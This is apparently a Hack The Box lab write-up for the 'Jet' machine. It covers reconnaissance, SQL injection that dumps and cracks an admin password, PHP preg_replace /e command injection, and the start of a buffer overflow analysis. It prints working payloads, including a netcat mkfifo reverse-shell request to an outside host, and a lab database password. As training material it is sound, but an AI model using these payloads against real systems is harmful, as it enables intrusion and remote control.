# Nmap
```
# Nmap 7.95 scan initiated Wed Jul 30 15:55:23 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.13.37.10
Nmap scan report for 10.13.37.10
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)
|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)
53/tcp   open  domain   ISC BIND 9.16.48 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.48-Ubuntu
80/tcp   open  http     nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx on Debian!
|_http-server-header: nginx/1.10.3 (Ubuntu)
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5555/tcp open  freeciv?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect: 
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|   NULL: 
|     enter your name:
|   SMBProgNeg: 
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|_    invalid option!
7777/tcp open  cbt?
| fingerprint-strings: 
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe: 
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|     Delete memo
|     Can't you read mate?
|   NULL: 
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|_    Delete memo
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5555-TCP:V=7.95%I=7%D=7/30%Time=688A4074%P=aarch64-unknown-linux-gn
SF:u%r(NULL,11,"enter\x20your\x20name:\n")%r(GenericLines,63,"enter\x20you
SF:r\x20name:\n\x1b\[31mMember\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edi
SF:t\n3\.\x20ban\n4\.\x20change\x20name\n5\.\x20get\x20gift\n6\.\x20exit\n
SF:")%r(DNSVersionBindReqTCP,63,"enter\x20your\x20name:\n\x1b\[31mMember\x
SF:20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.\x20change\
SF:x20name\n5\.\x20get\x20gift\n6\.\x20exit\n")%r(SMBProgNeg,9D1,"enter\x2
SF:0your\x20name:\n\x1b\[31mMember\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x2
SF:0edit\n3\.\x20ban\n4\.\x20change\x20name\n5\.\x20get\x20gift\n6\.\x20ex
SF:it\ninvalid\x20option!\n\x1b\[31mMember\x20manager!\x1b\[0m\n1\.\x20add
SF:\n2\.\x20edit\n3\.\x20ban\n4\.\x20change\x20name\n5\.\x20get\x20gift\n6
SF:\.\x20exit\ninvalid\x20option!\n\x1b\[31mMember\x20manager!\x1b\[0m\n1\
SF:.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.\x20change\x20name\n5\.\x20get\x2
SF:0gift\n6\.\x20exit\ninvalid\x20option!\n\x1b\[31mMember\x20manager!\x1b
SF:\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.\x20change\x20name\n5\.\x
SF:20get\x20gift\n6\.\x20exit\ninvalid\x20option!\n\x1b\[31mMember\x20mana
SF:ger!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.\x20change\x20nam
SF:e\n5\.\x20get\x20gift\n6\.\x20exit\ninvalid\x20option!\n\x1b\[31mMember
SF:\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.\x20chang
SF:e\x20name\n5\.\x20get\x20gift\n6\.\x20exit\ninvalid\x20option!\n\x1b\[3
SF:1mMember\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.\
SF:x20change\x20name\n5\.\x20get\x20gift\n6\.\x20exit\ninvalid\x20option!\
SF:n\x1b\[31mMember\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20b
SF:an\n4\.\x20change\x20name\n5\.\x20get\x20gift\n6\.\x20exit\ninvalid\x20
SF:option!\n\x1b\[31mMember\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n
SF:3\.\x20ban\n4\.\x20change\x20name\n5\.\x20get\x20gift\n6\.\x20exit\ninv
SF:alid\x20option!\n\x1b")%r(adbConnect,63,"enter\x20your\x20name:\n\x1b\[
SF:31mMember\x20manager!\x1b\[0m\n1\.\x20add\n2\.\x20edit\n3\.\x20ban\n4\.
SF:\x20change\x20name\n5\.\x20get\x20gift\n6\.\x20exit\n")%r(GetRequest,63
SF:,"enter\x20your\x20name:\n\x1b\[31mMember\x20manager!\x1b\[0m\n1\.\x20a
SF:dd\n2\.\x20edit\n3\.\x20ban\n4\.\x20change\x20name\n5\.\x20get\x20gift\
SF:n6\.\x20exit\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7777-TCP:V=7.95%I=7%D=7/30%Time=688A4074%P=aarch64-unknown-linux-gn
SF:u%r(NULL,5D,"\n--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n\[1\]\x20Cr
SF:eate\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x20memo\n\[4\
SF:]\x20Tap\x20out\n>\x20")%r(X11Probe,71,"\n--==\[\[\x20Spiritual\x20Memo
SF:\x20\]\]==--\n\n\[1\]\x20Create\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[
SF:3\]\x20Delete\x20memo\n\[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20read\x
SF:20mate\?")%r(Socks5,71,"\n--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n
SF:\[1\]\x20Create\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x2
SF:0memo\n\[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20read\x20mate\?")%r(Aru
SF:cer,71,"\n--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n\[1\]\x20Create\
SF:x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x20memo\n\[4\]\x20
SF:Tap\x20out\n>\x20Can't\x20you\x20read\x20mate\?")%r(GenericLines,71,"\n
SF:--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n\[1\]\x20Create\x20a\x20me
SF:mo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x20memo\n\[4\]\x20Tap\x20out
SF:\n>\x20Can't\x20you\x20read\x20mate\?")%r(GetRequest,71,"\n--==\[\[\x20
SF:Spiritual\x20Memo\x20\]\]==--\n\n\[1\]\x20Create\x20a\x20memo\n\[2\]\x2
SF:0Show\x20memo\n\[3\]\x20Delete\x20memo\n\[4\]\x20Tap\x20out\n>\x20Can't
SF:\x20you\x20read\x20mate\?")%r(HTTPOptions,71,"\n--==\[\[\x20Spiritual\x
SF:20Memo\x20\]\]==--\n\n\[1\]\x20Create\x20a\x20memo\n\[2\]\x20Show\x20me
SF:mo\n\[3\]\x20Delete\x20memo\n\[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20
SF:read\x20mate\?")%r(RTSPRequest,71,"\n--==\[\[\x20Spiritual\x20Memo\x20\
SF:]\]==--\n\n\[1\]\x20Create\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x
SF:20Delete\x20memo\n\[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20read\x20mat
SF:e\?")%r(RPCCheck,71,"\n--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n\[1
SF:\]\x20Create\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x20me
SF:mo\n\[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20read\x20mate\?")%r(DNSVer
SF:sionBindReqTCP,71,"\n--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n\[1\]
SF:\x20Create\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x20memo
SF:\n\[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20read\x20mate\?")%r(DNSStatu
SF:sRequestTCP,71,"\n--==\[\[\x20Spiritual\x20Memo\x20\]\]==--\n\n\[1\]\x2
SF:0Create\x20a\x20memo\n\[2\]\x20Show\x20memo\n\[3\]\x20Delete\x20memo\n\
SF:[4\]\x20Tap\x20out\n>\x20Can't\x20you\x20read\x20mate\?");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 30 15:58:30 2025 -- 1 IP address (1 host up) scanned in 187.19 seconds
```

# Page check
**index page**
![](images/Pasted%20image%2020250730155852.png)
Then I would want to check the valid web-contents here

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Jet]
└─$ ffuf -u http://10.13.37.10/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.10/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 4748ms]
.htaccess               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 4753ms]
.htpasswd               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 4753ms]
:: Progress: [4746/4746] :: Job [1/1] :: 101 req/sec :: Duration: [0:00:42] :: Errors: 0 ::

```

Nothing useful here, but like the description said, there should be a shopping center here.
```
Jet’s mission is to become the smartest way to shop and save on pretty much anything. Combining a revolutionary pricing engine, a world-class technology and fulfillment platform, and incredible customer service, we’ve set out to create a new kind of e-commerce.  At Jet, we’re passionate about empowering people to live and work brilliant.
```

So I guess there would be a `DNS` server to help us get the domain of these services.

# Dig the domains
Firstly, perform a reverse `DNS` lookup to obtain the domain associated with the IP address.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Jet]
└─$ dig @10.13.37.10 -x 10.13.37.10

; <<>> DiG 9.20.9-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42172
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 9ce63b842fe6ca75010000006889b65be6a3bcc43035d27c (good)
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; ANSWER SECTION:
10.37.13.10.in-addr.arpa. 604800 IN     PTR     www.securewebinc.jet.

;; Query time: 370 msec
;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
;; WHEN: Wed Jul 30 16:05:01 UTC 2025
;; MSG SIZE  rcvd: 115

```

Add `www.securewebinc.jet` to our `/etc/hosts`

Then we can successfully get the real page of this service here
![](images/Pasted%20image%2020250730160827.png)

Now we can try to enumerate the valid web-contents again
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Jet]
└─$ ffuf -u http://www.securewebinc.jet/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://www.securewebinc.jet/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 1672ms]
.htaccess               [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 1672ms]
.hta                    [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 1672ms]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 553ms]
img                     [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 244ms]
index.html              [Status: 200, Size: 8855, Words: 2495, Lines: 229, Duration: 244ms]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 825ms]
vendor                  [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 280ms]
:: Progress: [4746/4746] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```
That seems like nothing useful here, nothing like `login or register`

But when we check the source code of the index page
![](images/Pasted%20image%2020250730161221.png)
I found there are calling 2 js files
```
template.js (very normal one)

secure.js (seems like our target)
```

Then we can check it clearly
```
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```

This is an obfuscated JavaScript code.We can use `https://lelinhtinh.github.io/de4js/` to help us get the original js file
```
function getStats() {
    $.ajax({
        url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",

        success: function (result) {
            $('#attacks').html(result)
        },
        error: function (result) {
            console.log(result);
        }
    });
}
getStats();
setInterval(function () {
    getStats();
}, 10000);
```
Its core logic is to dynamically request data from a certain path `/dirb_safe_dir_rf9EmcEIx/admin/stats.php` and insert the response into the `#attacks `element in the page.

When we go to `/dirb_safe_dir_rf9EmcEIx/admin/`, it will redirect us to the login page
![](images/Pasted%20image%2020250730161754.png)

I have tried the default credit `admin:admin` here, but not work here.
![](images/Pasted%20image%2020250730162033.png)
But we can know user `admin` is existed here.

# sql-injection of login page
When I try `admin' and sleep(5)-- -` as the payload, it will wait for 5 seconds then give us the result of `unknown user`
![](images/Pasted%20image%2020250730162151.png)
So it can be `sql-injection` by time.
In this place, I would use `sqlmap` to help us dump the database.
Firstly, use `burpsuite` to catch the request firstly
![](images/Pasted%20image%2020250730162401.png)
Then run the command 
```
sqlmap -r sql.req --batch -dbs
---
[16:25:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[16:25:25] [INFO] fetching database names
[16:25:29] [INFO] retrieved: 'information_schema'
[16:25:30] [INFO] retrieved: 'jetadmin'
available databases [2]:                                                                                                                                                       
[*] information_schema
[*] jetadmin

[16:25:30] [INFO] fetched data logged to text files under '/home/wither/.local/share/sqlmap/output/www.securewebinc.jet'

[*] ending @ 16:25:30 /2025-07-30/

```

Then continue to check the database `jetadmin`
```
sqlmap -r sql.req --batch -D jetadmin -tables
---
[16:26:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0
[16:26:34] [INFO] fetching tables for database: 'jetadmin'
Database: jetadmin
[1 table]
+-------+
| users |
+-------+

[16:26:36] [INFO] fetched data logged to text files under '/home/wither/.local/share/sqlmap/output/www.securewebinc.jet'

[*] ending @ 16:26:36 /2025-07-30/

```

Then get dumped table `users`
```
sqlmap -r sql.req --batch -D jetadmin -T users -dump

Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+

[16:27:31] [INFO] table 'jetadmin.users' dumped to CSV file '/home/wither/.local/share/sqlmap/output/www.securewebinc.jet/dump/jetadmin/users.csv'
[16:27:31] [INFO] fetched data logged to text files under '/home/wither/.local/share/sqlmap/output/www.securewebinc.jet'

[*] ending @ 16:27:31 /2025-07-30/

```

We can use `hashcat` to crack this password
```
hashcat admin.hash /usr/share/wordlists/rockyou.txt  -m 1400

97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084:Hackthesystem200
```

# Command injection
Then we can use this credit `admin:Hackthesystem200` to `passby` the `auth`
![](images/Pasted%20image%2020250730163037.png)

In this page, only a send email function could be used 
![](images/Pasted%20image%2020250730163338.png)
Then I would try to send a email here and it needs my confirmation.
![](images/Pasted%20image%2020250730163407.png)
I would use `burpsuite` to help us find something exploitable
![](images/Pasted%20image%2020250730163634.png)
There seems like a Profanity filter
From the `chatgpt`, we can get the function used `preg_replace()`, then we can get the `poc`here
There is great detailed blog to show how to exploit that
```
https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
```
To exploit the code, all the attacker has to do is provide some PHP code to execute, generate a regular expression which replaces some or all of the string with the code, and set the `e` modifier on the regular expression/pattern
```
payload: index.php?pat=/a/e&rep=phpinfo();&sub=abc
```

In this place, let's try it `system('id')`
```
swearwords%5b%2ffuck%2fe%5d=system('id')&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40test.com&subject=fuck&message=%3Cp%3Efuck%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1

swearwords[/fuck/e]=system('id')&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=test@test.com&subject=fuck&message=<p>fuck<br></p>&_wysihtml5_mode=1
```
![](images/Pasted%20image%2020250730165349.png)

That means we can try to get the reverse shell by this command injection
```
swearwords[/fuck/e]=system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.5+443+>/tmp/f')&to=test@test.com&subject=test&message=fuck&_wysihtml5_mode=1  &swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=test@test.com&subject=fuck&message=<p>fuck<br></p>&_wysihtml5_mode=1
```

Then we can successfully get the shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Jet]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.37.10] 42044
bash: cannot set terminal process group (989): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ 

```

We can upgrade our reverse shell firstly
```
upgrade to PTY
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

From the file system of `www-data`
we can find the database credit 
```
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat db.php
cat db.php
<?php

$servername = "localhost";
$username = "jet";
$password = "dcr46kdl6zsld68idtyufldro";

// Create connection
$conn = new mysqli($servername, $username, $password,'jetadmin');

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

/* User Creation
$username = 'admin';
$password = 'apasswordhere';
$hashPassword = password_hash($password,PASSWORD_BCRYPT);

$sql = "insert into users (username, password) value('".$username."','".$hashPassword."')";
$result = mysqli_query($conn, $sql);
if($result)
{
    echo "Registration successfully";
}

```

And also we can get the target to switch from `/etc/passwd`
```
*/www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ch4p:x:1000:1000:ch4p,,,:/home/ch4p:/bin/bash
g0blin:x:1002:1002:g0blin,,,:/home/g0blin:/bin/bash
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
bind:x:112:118::/var/cache/bind:/bin/false
elasticsearch:x:113:119::/home/elasticsearch:/bin/false
alex:x:1005:1005:Alex Flores,,,:/home/alex:/bin/bash
membermanager:x:1006:1006:,,,:/home/membermanager:/bin/bash
memo:x:1007:1007:,,,:/home/memo:/bin/bash
tony:x:1008:1008:,,,:/home/tony:/bin/bash
```

# Buffer overflow in leak
After simply enumerating, I did not find anything useful here.Follow the hints of the `Flag description`, it said overflow, that means there would be something can be exploited binary

So let's check files with `suid` permissions
```
<fe_dir_rf9EmcEIx/admin$ find / -perm -4000 2>/dev/null                      

/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/lib/uncompress.so
/bin/mount
/bin/ntfs-3g
/bin/su
/bin/umount
/bin/ping6
/bin/ping
/bin/fusermount
/home/leak
```

Very clearly, `/home/leak` would be our target
```
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ file /home/leak
/home/leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped

www-data@jet:/home$ ls -al
total 44
drwxr-xr-x  8 root          root          4096 Apr  1  2018 .
drwxr-xr-x 23 root          root          4096 Apr  1  2018 ..
drwxrwx---  2 alex          alex          4096 Jan  3  2018 alex
drwxr-x---  7 ch4p          ch4p          4096 Apr  1  2018 ch4p
drwxr-x---  6 g0blin        g0blin        4096 Jul  3  2024 g0blin
-rwsr-xr-x  1 alex          alex          9112 Dec 12  2017 leak
drwxr-x---  2 membermanager membermanager 4096 Dec 28  2017 membermanager
drwxr-x---  2 memo          memo          4096 Dec 28  2017 memo
drwxr-xr-x  3 tony          tony          4096 Dec 28  2017 tony

www-data@jet:/home$ ./leak 
Oops, I'm leaking! 0x7ffebae46c30
Pwn me ¯\_(ツ)_/¯ 
> 
```
It belongs to `alex` and we can read it that means we can move it.

Let's download it to our local machine and check what is going on that
```
www-data@jet:/home$ nc 10.10.14.5 4444 < /home/leak

┌──(wither㉿localhost)-[~/Templates/htb-labs/Jet]
└─$ nc -lnvp 4444 > leak
listening on [any] 4444 ...

```

Then I would like use `ghidra` to help us `decompile` it
![](images/Pasted%20image%2020250730171122.png)
It was a very simple function here.
First, we define a string variable with a 64-byte buffer, then print a message and the beginning of the string, and use `fgets` to receive input.
`fgets` has the buffer overflow vulnerable

After using `checksec`, we found that the binary did not have any protections
```
❯ checksec leak
[*] '/home/kali/leak'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)  
    RWX:      Has RWX segments
```

First I created a specially crafted character patron using `gdb` and ran the program by giving the pattern as input, but the program got corrupted
```
❯ gdb -q ./leak
Reading symbols from leak...
(No debugging symbols found in leak)
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/kali/leak
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Oops, I'm leaking! 0x7fffffffe530
Pwn me ¯\_(ツ)_/¯ 
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
pwndbg>
```

Use `gdb`'s pattern_offset to view the offset
```
pwndbg> x/gx $rsp
0x7fffffffe578:	0x616161616161616a
pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)  
Found at offset 72
pwndbg>
```
We need 72 bytes before overwriting the RIP register
Creates a chain of 72 A's and 8 B's
```
❯ python3 -q
>>> "A" * 72 + "B" * 8
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'  
>>>
```

Then take this string as input
```
❯ gdb -q ./leak
Reading symbols from leak...
(No debugging symbols found in leak)
pwndbg> run
Starting program: /home/kali/leak
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Oops, I'm leaking! 0x7fffffffe530
Pwn me ¯\_(ツ)_/¯ 
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  

Program received signal SIGSEGV, Segmentation fault.
0x000000000040088e in main ()
pwndbg>
```

